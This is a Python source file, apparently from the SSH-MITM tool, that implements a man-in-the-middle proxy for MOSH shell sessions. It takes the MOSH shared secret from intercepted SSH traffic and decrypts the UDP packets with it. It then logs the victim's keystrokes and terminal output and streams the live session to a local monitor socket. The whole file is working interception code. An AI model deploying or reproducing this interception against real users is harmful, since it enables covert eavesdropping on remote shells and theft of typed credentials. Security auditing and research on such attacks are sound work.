import base64
import contextlib
import logging
import socket
import threading
import zlib
from collections import defaultdict
from typing import cast

from colored.colored import attr, fg
from cryptography.hazmat.primitives.ciphers.aead import AESOCB3

from sshmitm.apps.mosh import hostinput_pb2, transportinstruction_pb2, userinput_pb2
from sshmitm.moduleparser.colors import Colors
from sshmitm.session import Session
from sshmitm.utils import format_hex


class MonitorServer:
    """
    TCP server that streams raw MOSH server output to connected clients (e.g. netcat).

    All host bytes are buffered from the start of the session. Clients connecting
    later receive the full history first, then live updates. Multiple clients can
    connect simultaneously.

    :param listen_port: TCP port to listen on (0 = random free port)
    :param listen_ip: IP to bind to (default '127.0.0.1')
    """

    def __init__(self, listen_port: int = 0, listen_ip: str = "127.0.0.1") -> None:
        self._clients: list[socket.socket] = []
        self._lock = threading.Lock()
        self._buffer = bytearray()
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind((listen_ip, listen_port))
        self._server.listen(5)

    def get_port(self) -> int:
        return cast("int", self._server.getsockname()[1])

    def start(self) -> None:
        t = threading.Thread(target=self._accept_loop, daemon=True)
        t.start()

    def _accept_loop(self) -> None:
        while True:
            try:
                client, addr = self._server.accept()
                logging.info("MOSH monitor: client connected from %s", addr)
                with self._lock:
                    if self._buffer:
                        try:
                            client.sendall(bytes(self._buffer))
                        except OSError:
                            with contextlib.suppress(OSError):
                                client.close()
                            continue
                    self._clients.append(client)
            except Exception:  # pylint: disable=broad-exception-caught  # noqa: BLE001
                break

    def send(self, data: bytes) -> None:
        """Broadcast data to all connected clients and buffer for late-connecting clients."""
        with self._lock:
            self._buffer.extend(data)
            dead: list[socket.socket] = []
            for client in self._clients:
                try:
                    client.sendall(data)
                except OSError:
                    dead.append(client)
            for c in dead:
                self._clients.remove(c)
                with contextlib.suppress(OSError):
                    c.close()


def _decode_client_diff(diff: bytes) -> tuple[list[str], bytes | None]:
    lines: list[str] = []
    key_chunks: list[bytes] = []
    msg = userinput_pb2.UserMessage()
    msg.ParseFromString(diff)
    for instr in msg.instruction:
        if instr.HasExtension(userinput_pb2.keystroke):
            ks = instr.Extensions[userinput_pb2.keystroke]
            key_chunks.append(ks.keys)
            lines.append(f"  Keystroke: {ks.keys.decode('utf-8', errors='replace')!r}")
        elif instr.HasExtension(userinput_pb2.resize):
            rs = instr.Extensions[userinput_pb2.resize]
            lines.append(f"  Resize: {rs.width}x{rs.height}")
    keystroke_bytes = b"".join(key_chunks) if key_chunks else None
    return lines, keystroke_bytes


def _decode_host_diff(diff: bytes) -> tuple[list[str], bytes | None]:
    lines: list[str] = []
    raw_chunks: list[bytes] = []
    msg = hostinput_pb2.HostMessage()
    msg.ParseFromString(diff)
    for instr in msg.instruction:
        if instr.HasExtension(hostinput_pb2.hostbytes):
            hb = instr.Extensions[hostinput_pb2.hostbytes]
            raw_chunks.append(hb.hoststring)
            lines.append(
                f"  HostOutput: {hb.hoststring.decode('utf-8', errors='replace')!r}"
            )
        elif instr.HasExtension(hostinput_pb2.resize):
            rs = instr.Extensions[hostinput_pb2.resize]
            lines.append(f"  Resize: {rs.width}x{rs.height}")
        elif instr.HasExtension(hostinput_pb2.echoack):
            ea = instr.Extensions[hostinput_pb2.echoack]
            lines.append(f"  EchoAck: {ea.echo_ack_num}")
    host_output = b"".join(raw_chunks) if raw_chunks else None
    return lines, host_output


def _decode_diff(
    diff: bytes, is_client: bool
) -> tuple[list[str], bytes | None, bytes | None]:
    """
    Parse a MOSH diff blob.

    Returns (log_lines, host_output, keystroke_bytes):
    - host_output: concatenated raw HostBytes for the monitor (server→client only)
    - keystroke_bytes: concatenated keystroke bytes sent by the client (client→server only)
    """
    lines: list[str] = []
    host_output: bytes | None = None
    keystroke_bytes: bytes | None = None
    try:
        if is_client:
            lines, keystroke_bytes = _decode_client_diff(diff)
        else:
            lines, host_output = _decode_host_diff(diff)
    except Exception as exc:  # pylint: disable=broad-exception-caught  # noqa: BLE001
        lines.append(f"  [diff parse error: {exc}]")
    return lines, host_output, keystroke_bytes


def _decode_transport_instruction(
    payload: bytes, is_client: bool
) -> tuple[list[str], bytes | None, bytes | None, int, int]:
    """
    Decompress and parse a reassembled MOSH transport payload.

    Returns (log_lines, host_output, keystroke_bytes, old_num, new_num).
    old_num and new_num are used by the caller to show only sequential diffs,
    preventing duplicate output from MOSH retransmits that span already-shown states.
    """
    lines: list[str] = []
    host_output: bytes | None = None
    keystroke_bytes: bytes | None = None
    old_num: int = -1
    new_num: int = -1
    try:
        if payload[:2] in (b"\x78\x9c", b"\x78\xda", b"\x78\x01"):
            payload = zlib.decompress(payload)
        instr = transportinstruction_pb2.Instruction()
        instr.ParseFromString(payload)
        old_num = instr.old_num
        new_num = instr.new_num
        lines.append(
            f"  proto_version={instr.protocol_version}"
            f"  old={instr.old_num}  new={instr.new_num}"
            f"  ack={instr.ack_num}  throwaway={instr.throwaway_num}"
        )
        if instr.diff:
            diff_lines, host_output, keystroke_bytes = _decode_diff(
                instr.diff, is_client
            )
            lines += diff_lines
    except Exception as exc:  # pylint: disable=broad-exception-caught  # noqa: BLE001
        lines.append(f"  [Protobuf parse error: {exc}]")
    return lines, host_output, keystroke_bytes, old_num, new_num


class UdpProxy:
    """
    UdpProxy is a class to act as a proxy server for MOSH (Mobile shell) protocol

    This class provides the functionality of a proxy server for the MOSH protocol. MOSH is a protocol for mobile shell sessions, which helps maintain shell sessions when network connection is disrupted.

    :param key: Base64 encoded key to be used for decryption of incoming messages
    :param target_ip: IP of target server
    :param target_port: Port number of target server
    :param listen_ip: IP to bind the proxy server (default '')
    :param listen_port: Port number to bind the proxy server (default 0)
    :param buf_size: buffer size for incoming UDP datagrams (default 65535, the maximum UDP payload size)
    :param monitor_port: TCP port for the netcat monitor socket (0 = random, None = disabled)
    :param log_heartbeats: log packets that carry no terminal data (default False)
    :param show_debug: show low-level hex dump fields in log output (default False)
    """

    def __init__(  # pylint: disable=too-many-arguments
        self,
        key: str,
        target_ip: str,
        target_port: int,
        listen_ip: str = "",
        listen_port: int = 0,
        buf_size: int = 65535,
        monitor_port: int | None = 0,
        log_heartbeats: bool = False,
        show_debug: bool = False,
    ) -> None:
        self.key = base64.b64decode(key + "==")
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.target_ip = target_ip
        self.target_port = target_port
        self.buf_size = buf_size
        self.pair_list: list[list[tuple[str, int]]] = []
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.bind((self.listen_ip, self.listen_port))
        # Key: (src_addr, fragment_id_int) → {fragment_num: payload_bytes}
        self._fragments: dict[tuple[tuple[str, int], int], dict[int, bytes]] = (
            defaultdict(dict)
        )
        # Highest fragment number of the final fragment per reassembly key,
        # needed to detect late-arriving non-final fragments after the final arrived.
        self._fragment_finals: dict[tuple[tuple[str, int], int], int] = {}

        self.show_debug = show_debug
        self._monitor: MonitorServer | None = None
        if monitor_port is not None:
            self._monitor = MonitorServer(listen_port=monitor_port)
            self._monitor.start()
            port = self._monitor.get_port()
            logging.info(
                "%s MOSH monitor on port %s - view intercepted session with: %s",
                Colors.emoji("information"),
                Colors.stylize(port, fg("light_blue") + attr("bold")),
                Colors.stylize(
                    f"ssh-mitm mosh client 127.0.0.1 {port}",
                    fg("light_blue") + attr("bold"),
                ),
            )
        # Highest server new_num seen — used to skip already-processed diffs.
        self._server_max_new_num: int = -1
        # Track the last old_num and how many HostBytes we already sent from it,
        # so that a later diff from the same old_num (e.g. with EchoAck added or
        # with extra content like a vim screen after pressing Enter) can skip the
        # already-shown prefix.
        self._last_server_old_num: int = -1
        self._last_server_host_len: int = 0
        self.log_heartbeats = log_heartbeats

    def get_bind_port(self) -> int:
        """
        Get the port number that the proxy server is bound to.

        :return: Port number
        """
        return cast("int", self.socket.getsockname()[1])

    def start(self) -> None:
        """
        Start the proxy server.
        """
        timed_thread = threading.Timer(0, self.thread_receive)
        timed_thread.daemon = True
        timed_thread.start()

    def check_pairing(self, addr: tuple[str, int]) -> tuple[str, int]:
        """
        Get the destination address to forward incoming messages to.

        :param addr: Address of incoming message
        :return: Destination address
        """
        for pair_entry in self.pair_list:
            if addr == pair_entry[0]:
                return pair_entry[1]
            if addr == pair_entry[1]:
                return pair_entry[0]
        new_port = len(self.pair_list) + self.target_port
        destination_addr = (self.target_ip, new_port)
        self.pair_list.append([addr, destination_addr])
        return destination_addr

    def _is_client(self, addr: tuple[str, int]) -> bool:
        """Return True if addr is a client (not the MOSH server)."""
        return all(addr != pair[1] for pair in self.pair_list)

    def _handle_fragment(
        self,
        src_addr: tuple[str, int],
        fragment_id: bytes,
        final_fragment: bytes,
        payload: bytes,
    ) -> bytes | None:
        """Reassemble MOSH fragments. Returns the complete payload when all fragments arrived."""
        frag_id = int.from_bytes(fragment_id, "big")
        frag_num_raw = int.from_bytes(final_fragment, "big")
        is_final = bool(frag_num_raw & 0x8000)
        frag_num = frag_num_raw & 0x7FFF

        key = (src_addr, frag_id)
        self._fragments[key][frag_num] = payload

        if is_final:
            self._fragment_finals[key] = frag_num

        # Attempt reassembly whenever we know the final fragment number,
        # even if this packet is not the final one (handles out-of-order delivery).
        final_num = self._fragment_finals.get(key)
        if final_num is not None:
            frags = self._fragments[key]
            if all(i in frags for i in range(final_num + 1)):
                assembled = b"".join(frags[i] for i in range(final_num + 1))
                del self._fragments[key]
                del self._fragment_finals[key]
                return assembled
        return None

    def receive(self, buff_size: int) -> None:
        """
        Receive incoming messages, decrypt and log the data, and forward it to the target server.

        :param buff_size: buffer size for incoming data
        """
        data, addr = self.socket.recvfrom(buff_size)
        if addr and data:
            destination_addr = self.check_pairing(addr)

            nonce = b"\x00\x00\x00\x00" + data[:8]
            message = data[8:]
            aesocb = AESOCB3(self.key)
            dec_message = aesocb.decrypt(nonce, message, None)

            timestamp = dec_message[:2]
            timestamp_reply = dec_message[2:4]
            fragment_id = dec_message[4:12]
            final_fragment = dec_message[12:14]
            final_fragment_bool = bool(int.from_bytes(final_fragment, "big") & 0x8000)
            payload = dec_message[14:]

            assembled = self._handle_fragment(
                addr, fragment_id, final_fragment, payload
            )
            is_heartbeat = False
            if assembled is not None:
                is_client = self._is_client(addr)
                direction = "Client→Server" if is_client else "Server→Client"
                proto_lines, host_output, keystroke_bytes, old_num, new_num = (
                    _decode_transport_instruction(assembled, is_client)
                )
                # Packets with no HostBytes and no Keystrokes carry only timing/ack
                # metadata (heartbeats or EchoAck-only). Nothing to forward to the monitor.
                is_heartbeat = host_output is None and keystroke_bytes is None
                if (
                    host_output is not None
                    and self._monitor is not None
                    and new_num > self._server_max_new_num
                ):
                    host_bytes = cast("bytes", host_output)  # type: ignore[redundant-cast]
                    # The server often sends two diffs from the same old_num:
                    # first without EchoAck, then with EchoAck (and sometimes
                    # with extra content, e.g. a vim screen after pressing Enter).
                    # Skip the bytes we already sent from this old_num so we
                    # only forward the genuinely new suffix.
                    bytes_to_skip = (
                        self._last_server_host_len
                        if old_num == self._last_server_old_num
                        else 0
                    )
                    output = host_bytes[  # pylint: disable=unsubscriptable-object
                        bytes_to_skip:
                    ]
                    self._server_max_new_num = new_num
                    self._last_server_old_num = old_num
                    self._last_server_host_len = len(host_bytes)
                    if output:
                        self._monitor.send(output)

            if self.show_debug and (not is_heartbeat or self.log_heartbeats):
                data_to_print = [
                    f"{Colors.stylize('MOSH Data', attr('bold'))}",
                    f"from->to: {addr} -> {destination_addr}",
                    f"timestamp (ms): {int.from_bytes(timestamp, 'big')} (0x{timestamp.hex()})",
                    f"timestamp_reply (ms): {int.from_bytes(timestamp_reply, 'big')} (0x{timestamp_reply.hex()})",
                    f"fragment_id: 0x{fragment_id.hex()}",
                    f"final_fragment:  {final_fragment_bool} (0x{final_fragment.hex()})",
                    f"Payload:\n{format_hex(payload)}",
                ]
                if assembled is not None:
                    data_to_print.append(f"Protobuf ({direction}):")
                    data_to_print += proto_lines
                data_to_print.append("-" * 89)
                logging.info("\n".join(data_to_print))

            self.socket.sendto(data, destination_addr)

    def thread_receive(self) -> None:
        """
        Start a separate thread to receive incoming messages.
        """
        while True:
            try:
                self.receive(self.buf_size)
            except Exception:  # pylint: disable=broad-exception-caught
                logging.exception("Error receiving MOSH packet")


def handle_mosh(session: Session, traffic: bytes, isclient: bool) -> bytes:
    """
    Handle encrypted traffic from Mosh, a mobile shell that serves as a replacement for ssh.

    :param session: A Session object representing the Mosh connection.
    :param traffic: Encrypted traffic from Mosh.
    :param isclient: A boolean value indicating whether the current session is a client session.
    :return: The processed traffic.
    """
    if not isclient:
        try:
            mosh_connect = traffic.decode("utf8")
            logging.info(mosh_connect)
            mosh_connect_parts = mosh_connect.strip().split(" ")
            mosh_info = "\n".join(
                [
                    Colors.stylize(
                        Colors.emoji("information") + " MOSH connection info",
                        fg("blue") + attr("bold"),
                    ),
                    f"  * MOSH-port: {mosh_connect_parts[2]}",
                    f"  * MOSH-shared-secret: {mosh_connect_parts[3]}",
                ]
            )
            logging.info(mosh_info)

            if session.remote_address[0] is not None:
                mosh_proxy = UdpProxy(
                    key=mosh_connect_parts[3],
                    target_ip=session.remote_address[0],
                    target_port=int(mosh_connect_parts[2]),
                    listen_ip="0.0.0.0",  # nosec # mosh server needs to listen on all addresses to intercept traffic
                    listen_port=(
                        0
                        if session.remote_address[0] == "127.0.0.1"
                        else int(mosh_connect_parts[2])
                    ),
                )
                mosh_port = mosh_proxy.get_bind_port()
                mosh_proxy.start()
                logging.info(
                    "%s MOSH proxy started on port %s - the SSH connection will close, but MOSH remains active",
                    Colors.emoji("information"),
                    Colors.stylize(mosh_port, fg("light_blue") + attr("bold")),
                )
                return f"MOSH CONNECT {mosh_port} {mosh_connect_parts[3]}".encode()
        except Exception:  # pylint: disable=broad-exception-caught
            logging.exception("Error starting mosh proxy")
    return traffic
